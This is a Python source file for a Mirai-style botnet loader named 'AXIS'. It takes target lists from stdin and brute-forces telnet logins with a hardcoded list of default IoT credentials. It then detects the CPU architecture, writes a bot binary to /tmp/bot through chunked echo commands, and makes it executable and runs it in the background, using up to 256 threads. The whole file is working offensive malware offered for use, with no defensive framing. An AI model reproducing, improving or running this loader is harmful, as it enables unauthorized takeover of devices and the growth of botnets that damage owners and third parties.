#!/usr/bin/env python3
"""
AXIS Botnet - Python Loader
Connects to telnet devices, identifies architecture, and uploads binaries
"""

import socket
import select
import threading
import time
import sys
import os
import re
from dataclasses import dataclass
from typing import Optional, Dict, List
from enum import Enum

# Configuration
class Config:
    # Loader server settings
    SERVER_HOST = "0.0.0.0"
    SERVER_PORT = 48101
    
    # Connection timeouts
    CONNECT_TIMEOUT = 5
    LOGIN_TIMEOUT = 10
    UPLOAD_TIMEOUT = 30
    
    # Retry settings
    MAX_RETRIES = 2
    RETRY_DELAY = 1
    
    # Binary paths
    BINARIES_DIR = "bins"
    
    # Supported architectures and their binary names
    ARCH_BINARIES = {
        "arm": "arm7",
        "armv7": "arm7", 
        "armv5": "arm5",
        "armv6": "arm5",
        "mips": "mips",
        "mipsel": "mipsel",
        "mips64": "mips",
        "x86": "x86",
        "x86_64": "x64",
        "i686": "x86",
        "i386": "x86",
        "powerpc": "ppc",
        "ppc": "ppc",
        "sh4": "sh4",
        "sparc": "sparc",
        "m68k": "m68k",
        "arc": "arc",
    }

class DeviceStatus(Enum):
    CONNECTING = "connecting"
    AUTHENTICATING = "authenticating"
    DETECTING_ARCH = "detecting_arch"
    UPLOADING = "uploading"
    CHMODDING = "chmodding"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"

@dataclass
class TelnetConnection:
    host: str
    port: int
    username: str
    password: str
    socket: Optional[socket.socket] = None
    status: DeviceStatus = DeviceStatus.CONNECTING
    arch: str = "unknown"
    buffer: str = ""
    
class LoaderStats:
    def __init__(self):
        self.total_connections = 0
        self.successful_logins = 0
        self.successful_uploads = 0
        self.failed = 0
        self.current_open = 0
        self.lock = threading.Lock()
    
    def increment(self, field: str):
        with self.lock:
            setattr(self, field, getattr(self, field) + 1)
    
    def display(self):
        with self.lock:
            return (f"[{time.strftime('%H:%M:%S')}] "
                   f"Conn: {self.current_open} | "
                   f"Logins: {self.successful_logins} | "
                   f"Success: {self.successful_uploads} | "
                   f"Fail: {self.failed}")

stats = LoaderStats()

class TelnetHandler:
    """Handles individual telnet connection to a device"""
    
    # Common telnet credentials
    COMMON_CREDS = [
        ("admin", "admin"),
        ("root", "root"),
        ("admin", "1234"),
        ("root", "vizxv"),
        ("admin", "admin123"),
        ("root", "admin"),
        ("user", "user"),
        ("guest", "guest"),
        ("support", "support"),
        ("manager", "manager"),
    ]
    
    # Architecture detection commands
    ARCH_CMDS = [
        "uname -m",
        "uname -a",
        "cat /proc/cpuinfo",
        "busybox",
    ]
    
    def __init__(self, conn: TelnetConnection):
        self.conn = conn
        self.sock: Optional[socket.socket] = None
        
    def connect(self) -> bool:
        """Establish telnet connection"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(Config.CONNECT_TIMEOUT)
            self.sock.connect((self.conn.host, self.conn.port))
            self.conn.status = DeviceStatus.CONNECTING
            return True
        except Exception as e:
            return False
    
    def read_until_prompt(self, timeout: float = 5.0) -> str:
        """Read data until we hit a prompt or timeout"""
        self.sock.settimeout(timeout)
        data = b""
        
        try:
            while True:
                chunk = self.sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                
                # Check for common prompts
                decoded = data.decode('utf-8', errors='ignore').lower()
                if any(p in decoded for p in ['#', '$', '>', 'login:', 'password:', 'username:']):
                    break
        except socket.timeout:
            pass
        
        return data.decode('utf-8', errors='ignore')
    
    def send(self, data: str):
        """Send data to the device"""
        try:
            self.sock.sendall(data.encode() + b'\r\n')
        except:
            pass
    
    def login(self) -> bool:
        """Attempt to login with provided or common credentials"""
        # First try provided credentials
        creds_to_try = [(self.conn.username, self.conn.password)]
        
        # Add common credentials if provided creds fail
        if self.conn.username and self.conn.password:
            creds_to_try.extend(self.COMMON_CREDS)
        else:
            creds_to_try = self.COMMON_CREDS
        
        for username, password in creds_to_try:
            try:
                # Read initial banner
                self.read_until_prompt(2.0)
                
                # Send username
                self.send(username)
                time.sleep(0.5)
                resp = self.read_until_prompt(2.0)
                
                # Check if it's asking for password
                if 'password' in resp.lower() or 'pass' in resp.lower():
                    self.send(password)
                    time.sleep(0.5)
                    resp = self.read_until_prompt(3.0)
                    
                    # Check for successful login
                    if '#' in resp or '$' in resp:
                        self.conn.username = username
                        self.conn.password = password
                        stats.increment('successful_logins')
                        return True
                elif '#' in resp or '$' in resp:
                    # No password required (rare but happens)
                    stats.increment('successful_logins')
                    return True
                    
            except Exception as e:
                continue
        
        return False
    
    def detect_architecture(self) -> str:
        """Detect device architecture"""
        for cmd in self.ARCH_CMDS:
            try:
                self.send(cmd)
                time.sleep(0.5)
                resp = self.read_until_prompt(2.0).lower()
                
                # Parse architecture from response
                for arch_key, binary in Config.ARCH_BINARIES.items():
                    if arch_key in resp:
                        self.conn.arch = arch_key
                        return binary
                
                # Default fallbacks
                if 'mips' in resp:
                    return 'mipsel' if 'little' in resp else 'mips'
                if 'arm' in resp:
                    return 'arm7'
                if 'x86' in resp or 'i686' in resp:
                    return 'x86'
                    
            except:
                continue
        
        # Default to MIPS
        return 'mips'
    
    def upload_binary(self, binary_name: str) -> bool:
        """Upload binary to device"""
        binary_path = os.path.join(Config.BINARIES_DIR, binary_name)
        
        if not os.path.exists(binary_path):
            return False
        
        try:
            with open(binary_path, 'rb') as f:
                binary_data = f.read()
            
            # Use echo with base64 or direct write
            # Method 1: Direct echo (works on most devices)
            self.send("cd /tmp")
            time.sleep(0.3)
            self.read_until_prompt(1.0)
            
            # Write binary in chunks
            chunk_size = 128
            for i in range(0, len(binary_data), chunk_size):
                chunk = binary_data[i:i+chunk_size]
                hex_data = chunk.hex()
                hex_str = ' '.join([hex_data[j:j+2] for j in range(0, len(hex_data), 2)])
                self.send(f"echo -ne '\\x{hex_str.replace(' ', '\\x\\x')}' >> /tmp/bot")
                time.sleep(0.05)
            
            self.read_until_prompt(1.0)
            return True
            
        except Exception as e:
            return False
    
    def run_binary(self, binary_name: str) -> bool:
        """Make binary executable and run it"""
        try:
            # Set executable
            self.send("chmod +x /tmp/bot")
            time.sleep(0.3)
            
            # Run in background
            self.send("/tmp/bot &")
            time.sleep(0.5)
            
            self.read_until_prompt(1.0)
            return True
        except:
            return False
    
    def close(self):
        """Close connection"""
        if self.sock:
            try:
                self.sock.close()
            except:
                pass

def handle_connection(conn: TelnetConnection):
    """Handle a single device connection"""
    stats.increment('total_connections')
    with stats.lock:
        stats.current_open += 1
    
    handler = TelnetHandler(conn)
    
    try:
        # Connect
        if not handler.connect():
            stats.increment('failed')
            return
        
        # Login
        if not handler.login():
            stats.increment('failed')
            return
        
        # Detect architecture
        binary_name = handler.detect_architecture()
        
        # Upload binary
        if not handler.upload_binary(binary_name):
            stats.increment('failed')
            return
        
        # Run binary
        if not handler.run_binary(binary_name):
            stats.increment('failed')
            return
        
        stats.increment('successful_uploads')
        print(f"\n[+] Success: {conn.host}:{conn.port} ({conn.arch})")
        
    except Exception as e:
        stats.increment('failed')
    finally:
        handler.close()
        with stats.lock:
            stats.current_open -= 1

def stats_thread():
    """Display statistics periodically"""
    while True:
        time.sleep(5)
        print(stats.display())

def parse_input_line(line: str) -> Optional[TelnetConnection]:
    """Parse input line in format IP:PORT username:password [arch]"""
    parts = line.strip().split()
    if len(parts) < 2:
        return None
    
    # Parse IP:PORT
    host_port = parts[0].split(':')
    if len(host_port) != 2:
        return None
    
    try:
        port = int(host_port[1])
    except:
        port = 23
    
    # Parse username:password
    user_pass = parts[1].split(':')
    if len(user_pass) != 2:
        return None
    
    arch = parts[2] if len(parts) > 2 else "unknown"
    
    return TelnetConnection(
        host=host_port[0],
        port=port,
        username=user_pass[0],
        password=user_pass[1],
        arch=arch
    )

def main():
    print("AXIS Botnet Loader (Python)")
    print("==========================")
    print("Format: IP:PORT username:password [architecture]")
    print("Example: 192.168.1.1:23 admin:admin")
    print()
    
    # Start stats thread
    stats_timer = threading.Thread(target=stats_thread, daemon=True)
    stats_timer.start()
    
    # Process input
    max_threads = 256
    semaphore = threading.Semaphore(max_threads)
    
    try:
        for line in sys.stdin:
            conn = parse_input_line(line)
            if conn:
                semaphore.acquire()
                
                def worker(c=conn):
                    try:
                        handle_connection(c)
                    finally:
                        semaphore.release()
                
                thread = threading.Thread(target=worker, daemon=True)
                thread.start()
    
    except KeyboardInterrupt:
        print("\nShutting down...")
    
    # Wait for active connections
    while stats.current_open > 0:
        time.sleep(1)

if __name__ == "__main__":
    main()
